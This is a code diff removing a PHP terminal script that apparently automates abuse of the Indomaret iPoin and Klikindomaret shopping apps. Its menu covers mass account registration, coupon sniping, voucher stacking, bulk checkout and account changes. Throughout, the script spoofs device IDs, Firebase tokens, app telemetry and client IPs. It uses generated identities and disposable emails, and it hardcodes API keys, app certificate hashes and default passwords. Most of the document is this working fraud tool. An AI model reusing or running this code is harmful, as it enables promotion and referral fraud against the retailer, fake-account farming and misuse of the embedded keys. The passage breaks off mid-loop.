@@ -1,6854 +1,626 @@
-
-error_reporting(0);
-//TM001
-system("clear");
-function url($url){
-$headers = array();
-$headers[] = "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Mobile Safari/537.36";
-$ch = curl_init();
-      curl_setopt($ch, CURLOPT_URL, $url);
-      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-      $res = curl_exec($ch);
-return $res;
-}
-$baner = "\033[1;92m________  ________  _____              
-/_  __/  |/  / ___/ / ___/______ _    __
- / / / /|_/ / /__  / /__/ __/ -_) |/|/ /
-/_/ /_/  /_/\___/  \___/_/  \__/|__,__/";
-if(!file_exists('.xxx')) {
-    mkdir('.xxx');
-}
-system("clear");
-awalmula:
-echo "$baner
-\033[1;31m ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-status:$o\n";
-echo " \n menu : \n";
-echo @color('red', "|1 REGIS IPOIN + KLIK\n");
-echo @color('yellow', "|2 REGISTRASI AKUN KLIK\n");
-echo @color('yellow', "|3 CEK KUPON DELAY\n");
-echo @color('yellow', "|4 NEMPEL VOCER\n");
-echo @color('yellow', "|5 COK\n");
-echo @color('yellow', "|6 HAPUS SEMUA KERANJANG\n");
-echo @color('yellow', "|7 CEK STOK TOKO\n");
-echo @color('yellow', "|8 CEK PIN TRANSAKSI\n");
-echo @color('yellow', "|9 GANTI TOKO\n");
-echo @color('yellow', "|10 ISI ALAMAT MASAL\n");
-echo @color('yellow', "|11 HAPUS ALAMAT MASAL\n");
-echo @color('yellow', "|12 NEMPEL VOCER KLIK + BABY10\n");
-echo @color('yellow', "|13 ISI KERANJANG MASAL\n");
-echo @color('yellow', "|14 COK MASAL\n");
-echo @color('yellow', "|15 CEK KERANJANG\n");
-echo @color('red', "|16 DOR\n");
-echo @color('yellow', "|17 CEK KUPON NOTIF\n");
-echo @color('yellow', "|18 EKSEKUSI MULTI KUPON\n");
-echo @color('yellow', "|19 CEK SALDO AKUN\n");
-echo @color('yellow', "|20 HAPUS SEMUA KUPON \n");
-echo @color('yellow', "|21 UBAH PASSWORD\n");
-echo @color('yellow', "|22 GANTI NAMA DEPAN KLIK\n");
-echo @color('yellow', "|23 CEK KUPON NEMPEL\n");
-echo @color('yellow', "|24 HAPUS KUPON TERTENTU\n");
-echo @color('yellow', "|25 REGISTRASI KLIK X SMS-ACTIVATE\n");
-echo @color('yellow', "|26 REGIS AKUN KLIK + REFF\n");
-echo @color('yellow', "|27 CO AKUN REFF\n");
-echo @color('red', "|X EXIT\n");
-echo @color('green', "Ketik help jika anda bingung \n");
-echo @color('grey', "PILIH : ");
-$choice = trim(fgets(STDIN));
-echo "\n";
-switch ($choice) {
-
-    case 'help':
-        echo @color('yellow', "[1] REGIS IPOIN + KLIK\n");
-        echo @color('nevy', "Menu ini untuk registrasi akun mypoin dan klikindomaret. Ada berbagai pilihan di dalamnya\n");
-        echo @color('yellow', "[2] REGISTRASI AKUN KLIK\n");
-        echo @color('nevy', "Menu ini untuk registrasi akun klikindomaret\n");
-echo @color('yellow', "[3] CEK KUPON DELAY\n");
-echo @color('nevy', "Menu ini untuk cek kupon pada akun delay ipoin\n");
-echo @color('yellow', "[4] NEMPEL VOCER\n");
-echo @color('nevy', "Menu ini untuk menempelkan voucher ke akun klikindomaret\n");
-echo @color('yellow', "[5] COK\n");
-echo @color('nevy', "Menu ini untuk co / belanja akun klikindomaret\n");
-echo @color('yellow', "[6] HAPUS SEMUA ISI KERANJANG\n");
-echo @color('nevy', "Menu ini untuk menghapus semua isi keranjang akun anda\n");
-echo @color('yellow', "[7] CEK STOK TOKO\n");
-echo @color('nevy', "Menu ini untuk cek stok toko sesuai yg ada pada keranjang akun anda. Support cek semua item yang ada pada keranjang anda\n");
-echo @color('yellow', "[8] CEK PIN TRANSAKSI\n");
-echo @color('nevy', "Menu ini untuk cek pin dan kode transaksi pada akun klikindomaret\n");
-echo @color('yellow', "[9] GANTI TOKO\n");
-echo @color('nevy', "Menu ini untuk ubah kode toko akun klikindomaret\n");
-echo @color('yellow', "[10] ISI ALAMAT MASAL\n");
-echo @color('nevy', "Menu ini untuk mengisi alamat acak sesuai kode pos yang anda input untuk akun klikindomaret\n");
-echo @color('yellow', "[11] HAPUS ALAMAT MASAL\n");
-echo @color('nevy', "Menu ini untuk menghapus alamat yang ada pada akun klikindomaret\n");
-echo @color('yellow', "[12] NEMPEL VOCER KLIK + BABY10\n");
-echo @color('nevy', "Menu ini untuk khusus untuk menempelkan voucher ipoin dan BABY10 ke akun klikindomaret\n");
-echo @color('yellow', "[13] ISI KERANJANG MASAL\n");
-echo @color('nevy', "Menu ini untuk mengisi item sesuai yang anda inginkan ke akun klikindomaret\n");
-echo @color('yellow', "[14] COK MASAL\n");
-echo @color('nevy', "Menu ini untuk co / belanja akun klikindomaret dengan akun yang sudah ada keranjang\n");
-echo @color('yellow', "[15] CEK KERANJANG\n");
-        echo @color('nevy', "Menu ini untuk menyiapkan file dengan kupon yg diinginkan\n");
-echo @color('yellow', "[16] DOR\n");
-echo @color('nevy', "Menu ini untuk shoot kupon pada saat kupon tersebut sudah on (harus menyiapkan file dengan menu nomor 15)\n");
-echo @color('yellow', "[17] CEK KUPON NOTIF\n");
-echo @color('nevy', "Menu ini untuk cek kupon yang ada pada notif akun klikindomaret\n");
-echo @color('yellow', "[18] EKSEKUSI MULTI KUPON\n");
-echo @color('nevy', "Menu ini untuk menempelkan beberapa kupon ke akun klikindomaret\n");
-echo @color('yellow', "[19] CEK SALDO AKUN\n");
-echo @color('nevy', "Menu ini untuk cek saldo pada akun klikindomaret\n");
-echo @color('yellow', "[20] HAPUS SEMUA KUPON\n");
-echo @color('nevy', "Menu ini hapus semua kupon yang nempel di akun klikindomaret\n");
-echo @color('yellow', "[21] UBAH PASSWORD\n");
-echo @color('nevy', "Menu ini untuk ubah katasandi akun klikindomaret\n");
-echo @color('red', "[X] EXIT\n");
-echo @color('nevy', "Untuk keluar\n");
-
-break;
-
-	case '1':
-		echo color('yellow', "Nomor : ");
-		$nomor = trim(fgets(STDIN));
-		echo color('blue', "Regis Ipoin ..\n");
-		$ciuli = gen_uuid();
-		$xuid = $ciuli . "-" . round(microtime(true) * 1000);
-		$uuid = urut(16);
-		$ip = mt_rand(10, 40) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255);
-		$fid = urut2(22);
-		$bodi = '{"fid":"' . $fid . '","appId":"1:998816605328:android:dc02f786893a91906e6415","authVersion":"FIS_v2","sdkVersion":"a:17.0.0"}';
-		$headers = array();
-		$headers[] = 'Content-Type: application/json';
-		$headers[] = 'Accept: application/json';
-		$headers[] = 'Content-Encoding: gzip';
-		$headers[] = 'Cache-Control: no-cache';
-		$headers[] = 'X-Android-Package: mypoin.indomaret.android';
-		$headers[] = 'X-Firebase-Client: android-target-sdk/31 kotlin/1.6.10 fire-core-ktx/20.0.0 fire-cls/18.2.8 fire-cls-ktx/18.2.8 fire-core/20.0.0 fire-cfg-ktx/21.0.1 fire-fcm/23.0.0 device-brand/samsung fire-android/29 fire-abt/21.0.0 android-installer/com.android.vending device-model/z3s fire-installations/17.0.0 fire-analytics-ktx/20.1.0 fire-rc/21.0.1 fire-analytics/20.1.0 android-platform/ android-min-sdk/21 device-name/z3sxxx';
-		$headers[] = 'X-Firebase-Client-Log-Type: 3';
-		$headers[] = 'X-Android-Cert: A04FF9360D853349782EC0B69EDDDAFBE2F55C18';
-		$headers[] = 'X-Goog-Api-Key: AIzaSyBaP3PQ6uohRZ8QNdr4dD_SScoTCtaF7ok';
-		$headers[] = 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-G988B Build/QP1A.190711.020)';
-		$headers[] = 'Host: firebaseinstallations.googleapis.com';
-		$headers[] = 'Content-Length: ' . strlen($bodi);
-		$a = curl('https://firebaseinstallations.googleapis.com/v1/projects/idm-corp-prd/installations', $bodi, $headers);
-		$a1 = json_decode($a[1]);
-		$tkn = $a1->authToken->token;
-		$tokett = $fid . ':APA91bH3OoXxwsrJk51stLFbZO68z' . urut2(35) . '-' . urut2(35) . '-FUgFdwfFUa0jcdCO_NFuA95qdDB3ZFdU9pMxk6O';
-		$bodi2 = '{"appInstanceId":"' . $fid . '","appVersion":"22.12.300","countryCode":"ID","analyticsUserProperties":{},"appId":"1:998816605328:android:dc02f786893a91906e6415","platformVersion":"29","timeZone":"Asia\\/Jakarta","sdkVersion":"21.0.1","packageName":"mypoin.indomaret.android","appInstanceIdToken":"' . $tkn . '","languageCode":"id-ID","appBuild":"111"}';
-		$headers2 = array();
-		$headers2[] = 'X-Goog-Api-Key: AIzaSyBaP3PQ6uohRZ8QNdr4dD_SScoTCtaF7ok';
-		$headers2[] = 'X-Android-Package: mypoin.indomaret.android';
-		$headers2[] = 'X-Android-Cert: A04FF9360D853349782EC0B69EDDDAFBE2F55C18';
-		$headers2[] = 'X-Google-Gfe-Can-Retry: yes';
-		$headers2[] = 'X-Goog-Firebase-Installations-Auth: ' . $tkn;
-		$headers2[] = 'Content-Type: application/json';
-		$headers2[] = 'Accept: application/json';
-		$headers2[] = 'Content-Length: ' . strlen($bodi2);
-		$headers2[] = 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; SM-G988B Build/QP1A.190711.020)';
-		$headers2[] = 'Host: firebaseremoteconfig.googleapis.com';
-		$headers2[] = 'Connection: close';
-		$b = curl('https://firebaseremoteconfig.googleapis.com/v1/projects/998816605328/namespaces/firebase:fetch', $bodi2, $headers2);
-		$asu = array();
-		$asu[] = 'authorization: NNKSkTdooQo7vUGVG5eGkgYSVW7SabSjffafao35nfoan3ygfaa';
-		$asu[] = 'content-type: application/json; charset=UTF-8';
-		$asu[] = 'user-agent: okhttp/5.0.0-alpha.2';
-		$gas01 = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"activity_details":"resume_app","event_name":"app_activity","event_timestamp":' . round(microtime(true) * 1000) . '},"user":{"session_id":"' . $xuid . '","user_ip_address":"' . $ip . '"}}]}', $asu);
-		$gas2 = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"details":{"token":"' . $tokett . '"},"event_name":"page_detail","event_timestamp":' . round(microtime(true) * 1000) . ',"page_name":"Receive Push Notification "},"user":{"session_id":"' . $xuid . '","user_ip_address":"' . $ip . '"}}]}', $asu);
-		$gas2a = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"event_name":"page_view","event_timestamp":' . round(microtime(true) * 1000) . ',"page_name":"splash","page_urlpath":""},"user":{"session_id":"' . $xuid . '","user_ip_address":"' . $ip . '"}}]}', $asu);
-		$xoxo = array();
-		$xoxo[] = 'key: ZWR0czIwMjE6MHBsbW9rbg==';
-		$xoxo[] = 'apps: {"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-		$xoxo[] = 'Host: edtsapp.indomaretpoinku.com';
-		$xoxo[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-		$coks = curl('https://edtsapp.indomaretpoinku.com/configuration/api2506/mobile/sy-app-version/get-version-key/ANDROID', null, $xoxo);
-		$gas3 = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"event_name":"page_view","event_timestamp":' . round(microtime(true) * 1000) . ',"page_name":"login","page_urlpath":""},"user":{"session_id":"' . $xuid . '","user_ip_address":"' . $ip . '"}}]}', $asu);
-		$fcm = '' . $fid . ':APA91bGxVvyTN6Jivl5bm45ETkTqBWwkCu-' . urut2(35) . '_odRvalvU3mAaawssSEHXb_' . urut2(26) . '-wc6s4X1fOZLvjGq6vJWq';
-		$bodi3 = '{"userId":0,"deviceType":"01","deviceId":"' . $uuid . '","fcmToken":"' . $fcm . '"}';
-		$headers3 = array();
-		$headers3[] = 'Key: ZWR0czIwMjE6MHBsbW9rbg==';
-		$headers3[] = 'Apps: {"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-		$headers3[] = 'Content-Type: application/json; charset=UTF-8';
-		$headers3[] = 'Content-Length: ' . strlen($bodi3);
-		$headers3[] = 'Host: edtsapp.indomaretpoinku.com';
-		$headers3[] = 'Connection: close';
-		$headers3[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-		$c = curl('https://edtsapp.indomaretpoinku.com/notification/api2506/push-notifications/fcm-registration', $bodi3, $headers3);
-		$headers = array();
-		$headers[] = 'Key: ZWR0czIwMjE6MHBsbW9rbg==';
-		$headers[] = 'Apps: {"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-		$headers[] = 'Content-Type: application/json; charset=UTF-8';
-		$headers[] = 'Host: edtsapp.indomaretpoinku.com';
-		$headers[] = 'Connection: close';
-		$headers[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-		$cekdevice = curl('https://edtsapp.indomaretpoinku.com/login/api2506/open/pin/check-device', '{"phoneNumber":"' . $nomor . '","deviceId":"' . $uuid . '"}', $headers);
-		send:
-		#
-		$responasa = curl('https://edtsapp.indomaretpoinku.com/login/api2506/open/login-whatsapp', '{"deviceId":"' . $uuid . '","phoneNumber":"' . $nomor . '"}', $headers);
-		$respon = curl('https://edtsapp.indomaretpoinku.com/login/api2506/open/login-sms', '{"deviceId":"' . $uuid . '","phoneNumber":"' . $nomor . '"}', $headers);
-		if (strpos($respon[1], '"message":"Success"')) {
-			$cekdevice = curl('https://edtsapp.indomaretpoinku.com/login/api2506/open/pin/check-device', '{"phoneNumber":"' . $nomor . '","deviceId":"' . $uuid . '"}', $headers);
-			echo "OTP masuk ? {y/n} : ";
-			$again = trim(fgets(STDIN));
-			if (strtolower($again) == 'y') {
-				echo color('yellow', "OTP : ");
-				$otp = trim(fgets(STDIN));
-				$xoxo = array();
-				$xoxo[] = 'key: ZWR0czIwMjE6MHBsbW9rbg==';
-				$xoxo[] = 'apps: {"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-				$xoxo[] = 'Host: edtsapp.indomaretpoinku.com';
-				$xoxo[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-				$xoxo[] = 'Content-Type: application/json; charset=UTF-8';
-				$coks = curl('https://edtsapp.indomaretpoinku.com/configuration/api2506/mobile/sy-app-version/get-version-key/ANDROID', null, $xoxo);
-				$respon2 = curl('https://edtsapp.indomaretpoinku.com/login/api2506/open/login-verification-sms', '{"deviceId":"' . $uuid . '","otp":"' . $otp . '","phoneNumber":"' . $nomor . '"}', $headers);
-				if (strpos($respon2[1], '"message":"Success"')) {
-					$token = json_decode($respon2[1]);
-					$xx = $token->data->access_token;
-					$refresh_token = $token->data->refresh_token;
-					$xoxo = array();
-					$xoxo[] = 'Authorization: Bearer ' . $xx;
-					$xoxo[] = 'key: ZWR0czIwMjE6MHBsbW9rbg==';
-					$xoxo[] = 'apps: {"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-					$xoxo[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-					$xoxo[] = 'Content-Type: application/json; charset=UTF-8';
-					$cust = curl('https://edtsapp.indomaretpoinku.com/customer/api2506/mobile/get-data-customer', null, $xoxo);
-					if (strpos($cust[1], '"isNewRegister":false')) {
-						echo color('red', "Status : Member lama\n");
-					} else {
-						echo color('green', "Status : Member Baru\n");
-					}
-					$id = json_decode($cust[1])->data->id;
-					$memberid = json_decode($cust[1])->data->memberId;
-					$newmem = json_decode($cust[1])->data->isNewRegister;
-					$jancokx = curl('https://edtsapp.indomaretpoinku.com/configuration/api2506/mobile/skip-module/tr-skip-module', null, $xoxo);
-					$coks = curl('https://edtsapp.indomaretpoinku.com/configuration/api2506/mobile/sy-app-version/get-version-key/ANDROID', null, $xoxo);
-					$bodi4 = '{"userId":' . $id . ',"deviceType":"01","deviceId":"' . $uuid . '","fcmToken":"' . $fcm . '"}';
-					$headers4 = array();
-					$headers4[] = 'Key: ZWR0czIwMjE6MHBsbW9rbg==';
-					$headers4[] = 'Authorization: Bearer ' . $xx;
-					$headers4[] = 'Apps: {"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-					$headers4[] = 'Content-Type: application/json; charset=UTF-8';
-					$headers4[] = 'Host: edtsapp.indomaretpoinku.com';
-					$headers4[] = 'Content-Length: ' . strlen($bodi4);
-					$headers4[] = 'Connection: close';
-					$headers4[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-					$d = curl('https://edtsapp.indomaretpoinku.com/notification/api2506/push-notifications/fcm-registration', $bodi4, $headers4);
-					$gas4 = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"event_name":"page_view","event_timestamp":' . round(microtime(true) * 1000) . ',"page_name":"success login","page_urlpath":""},"user":{"session_id":"' . $xuid . '","user_id":' . $id . ',"user_ip_address":"' . $ip . '"}}]}', $asu);
-					$gas5 = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"failed_reason":"Success WA Verification","event_label":"login","event_name":"event_submission","event_status":"success","event_timestamp":' . round(microtime(true) * 1000) . '},"user":{"session_id":"' . $xuid . '","user_id":' . $id . ',"user_ip_address":"' . $ip . '"}}]}', $asu);
-					$gas6 = curl('https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway', '{"data":[{"application":{"app_version":"22.12.300","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"},"core":{"event_name":"page_view","event_timestamp":' . round(microtime(true) * 1000) . ',"page_name":"Exchange code","page_urlpath":""},"user":{"session_id":"' . $xuid . '","user_id":' . $id . ',"user_ip_address":"' . $ip . '"}}]}', $asu);
-					$cokss = curl('https://edtsapp.indomaretpoinku.com/configuration/api2506/mobile/sy-app-version/get-version-key/ANDROID', null, $xoxo);
-					$coksss = curl('https://edtsapp.indomaretpoinku.com/configuration/api2506/mobile/sy-app-version/get-version-key/ANDROID', null, $xoxo);
-					$kakaka = curl('https://edtsapp.indomaretpoinku.com/customer/api2506/is-whatsapp-verified', null, $xoxo);
-					#
-					$createpin = curl('https://edtsapp.indomaretpoinku.com//login/api2506/pin/create-pin', '{"pinCode":"112233"}', $xoxo);
-					gawepin:
-					if (strpos($createpin[1], '"message":"Success"')) {
-						echo @color('green', "Pin : 112233\n");
-					} elseif (strpos($createpin[1], '"message":"Pin already exist"')) {
-						goto inputcok;
-					} else {
-						echo "{$createpin[1]}\n";
-						echo @color('red', "Gagal buat pin\n");
-						goto gawepin;
-					}
-					inputcok:
-					#
-					$nomorr = 'https://barcode.tec-it.com/barcode.ashx?data=' . $nomor . '&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Png&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False';
-					file_put_contents("barcodeipoinManual/" . $nomor . ".png", file_get_contents($nomorr));
-					echo color('yellow', "Barcode tersimpan di folder ");
-					echo color('green', "barcodeipoinManual\n");
-					save($nomor . ";" . $uuid . ";112233\n", 'akunipoinmanual.txt');
-					save($nomor . ";" . $uuid . ";" . $xx . "\n", 'akunipoin.txt');
-					echo color('yellow', "Akun tersimpan di akunipoinmanual.txt\n");
-				} else {
-					echo color('red', "{$respon2[1]}\n");
-				}
-			} else {
-				goto send;
-			}
-		} else {
-			echo color('red', "{$respon[1]}\n");
-		}
-		echo color('blue', "Regis Klik ..\n");
-		unlink('nganue.txt');
-		$kuntul = array();
-		$kuntul[] = 'Content-Type: application/json';
-		$kuntul[] = 'Host: api.klikindomaret.com';
-		$kuntul[] = 'User-Agent: okhttp/3.12.1';
-		ngotepe:
-		$reg = curl('https://api.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=' . $nomor, null, $kuntul);
-		echo "OTP masuk ? {y/n} : ";
-		$againx = trim(fgets(STDIN));
-		if (strtolower($againx) == 'y') {
-			echo color('yellow', "OTP : ");
-			$otp = trim(fgets(STDIN));
-			$reg2 = curl('https://api.klikindomaret.com/api/PreRegistration/ValidationOTPCodeSMS?NoHP=' . $nomor . '&otpCode=' . $otp, null, $kuntul);
-			if (strpos($reg2[1], '"Message":"Verifikasi berhasil dilakukan."')) {
-				$data = file_get_contents("https://hiyaa.site/data.php?qty=1&domain=lostvape.my.id&apikey=d47d9a94-110f-4672-8851-8b749e0c7e3e");
-				$datas = json_decode($data);
-				$nama = $datas->result[0]->firstname;
-				$nama2 = $datas->result[0]->lastname;
-				$email = $datas->result[0]->email;
-				$getdev = curl('https://api.klikindomaret.com/api/MobileAppsVersion/getDevice_Token?device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad', null, $kuntul);
-				$kuntul2 = array();
-				$kuntul2[] = 'Content-Type: application/json';
-				$kuntul2[] = 'Host: api.klikindomaret.com';
-				$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-				$regis = curl('https://api.klikindomaret.com/api/Customer/RegisterViaMobileApps?districtID=2483&mfp_id=9525d94cce3e723ca591fbb655e2bf56fed124feeacead050566290598b579ac', '{"FName":"' . $nama . '","LName":"' . $nama2 . '","Email":"' . $email . '","KonfirmasiEmail":"","Gender":"Wanita","Mobile":"' . $nomor . '","KodeReferensi":"","Password":"123456a","ConfirmPassword":"123456a","IsConfirmed":true,"district":{"id":2483,"name":"Gunung Sahari Selatan"},"isShowPassword":false,"isShowPasswordConfirm":false,"errorMessageEmail":null,"errorMessageConfirmPassword":null,"ID":"00000000-0000-0000-0000-000000000000","IPAddress":"192.168.56.132","IsSubscribed":1,"IsNewsLetterSubscriber":1,"AllowSMS":false,"LastUpdate":"0001-01-01T00:00:00","DateOfBirth":"1996-01-' . rand(01, 30) . 'T00:00:00.000Z","DateOfBirthStringFormatted":"1996-01-' . rand(01, 30) . '","TypePushEmail":0,"IsUpload":false,"IsActivated":false,"MobileVerified":true,"DateOfBirthExists":"0001-01-01T00:00:00","OTPValidationExpired":false,"IsFromOtherSystem":false,"OTPCount":0,"OTPAvailable":0}', $kuntul2);
-				if (strpos($regis[1], '"IsSuccess":true')) {
-					echo @color('green', "Registrasi Berhasil\n");
-					echo @color('yellow', "Nomor : ");
-					echo @color('nevy', "{$nomor}\n");
-					echo @color('yellow', "Password : ");
-					echo @color('nevy', "akupadamu\n");
-					save($nomor . ";akupadamu\n", 'akunklik.txt');
-					echo @color('yellow', "Tersimpan di akunklik.txt\n");
-					echo "Verif email ? {y/n} : ";
-					$againxxxx = trim(fgets(STDIN));
-					if (strtolower($againxxxx) == 'n') {
-						goto nempelke;
-					}
-					$respi = json_decode($regis[1]);
-					$respid = $respi->ResponseID;
-					$send = curl('https://api.klikindomaret.com/api/Customer/GetByID/' . $respid . '?mfp_id=9525d94cce3e723ca591fbb655e2bf56fed124feeacead050566290598b579ac', null, $kuntul);
-					if (strpos($send[1], '"IsActivated":true')) {
-						echo @color('yellow', "Sedang verif email\n");
-						$emails = explode("@", $email);
-						$emailx = "surl=" . trim($emails[1]) . "%2F" . trim($emails[0]);
-						$xixi = array();
-						$xixi[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0';
-						$xixi[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
-						$xixi[] = 'Accept-Language: en-US,en;q=0.5';
-						$xixi[] = 'Connection: keep-alive';
-						$xixi[] = 'Cookie: ' . $emailx;
-						Awal:
-						$xyz = curl('https://generator.email/', null, $xixi, true);
-						if (strpos($xyz[1], 'Terima kasih telah melakukan registrasi di Klikindomaret.')) {
-							$res = remove_space($xyz[1]);
-							$link = get_between($res, 'https://www.klikindomaret.com/Customer/ActivationByEmail?Token=', '"rel="nofollow"target="_blank">');
-							if (empty($link)) {
-								die("Error!");
-							}
-							echo "\n";
-						} else {
-							echo ".";
-							goto Awal;
-						}
-						$pecah = explode('&amp;KodePIN=', $link);
-						$token = $pecah[0];
-						$pin = $pecah[1];
-						$verif = curl('https://api.klikindomaret.com/api/Customer/ActivationWithPINCode?mfp_id=2badfdf8-5d76-4c49-81cd-c7c3588eebc4', '{"PINCode":"' . $pin . '","Token":"' . $token . '"}', $kuntul);
-						if (strpos($verif[1], '"Message":"Success"')) {
-							echo @color('green', "Verifikasi Email Berhasil\n");
-							echo @color('yellow', "Email : ");
-							echo @color('nevy', "{$email}\n\n");
-							nempelke:
-							echo "LANJUT TEMPEL ? {y/n} : ";
-							$againxx = trim(fgets(STDIN));
-							if (strtolower($againxx) == 'y') {
-								tempelllx:
-								$kodetoko = $toko;
-								$kuntul = array();
-								$kuntul[] = 'Content-Type: application/json';
-								$kuntul[] = 'Host: api.klikindomaret.com';
-								$kuntul[] = 'User-Agent: okhttp/3.12.1';
-								$kuntul2x = array();
-								$kuntul2x[] = 'Content-Type: application/json';
-								$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-								$kuntul2x[] = 'Applicationkey: indomaret';
-								$kuntul2x[] = 'Authorization: ';
-								$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-								$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"akupadamu"}', $kuntul2x);
-								$respi = json_decode($verif[1]);
-								$respid = $respi->ResponseID;
-								$idne = $respi->ResponseObject->ID;
-								$toked = $respi->ResponseObject->Token;
-								$kuntul2 = array();
-								$kuntul2[] = 'Content-Type: application/json';
-								$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-								$kuntul2[] = 'Applicationkey: indomaret';
-								$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-								$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-								$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-								$responx = $cekvcne[1];
-								if (strpos($responx, '"IsActivated":true')) {
-									$cok = json_decode($responx);
-									$ID = $cok[0]->ID;
-									$RegionId = $cok[0]->RegionId;
-									$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-									//echo "$getscid[1]\n";
-									$za = json_decode($getscid[1]);
-									if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-										echo @color('red', "ERROR KAK\n");
-									} else {
-										$scid = $za[0];
-										$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetoko . '","StoreCodeDest":""}', $kuntul2);
-										echo "{$setaddress[1]}\n";
-										$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetoko . '&AddressType=0&CustomerAddressID=00000000-0000-0000-0000-000000000000&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-										for ($i = 0; $i < 1; $i++) {
-											$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=2&pId=3a0f3388-018f-4d63-9baf-51ded26e2f43&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-											$stt = json_decode($addproduk[1])[0]->Message;
-											$SCID = json_decode($addproduk[1])[0]->ResponseID;
-											echo @color('green', "{$stt}\n");
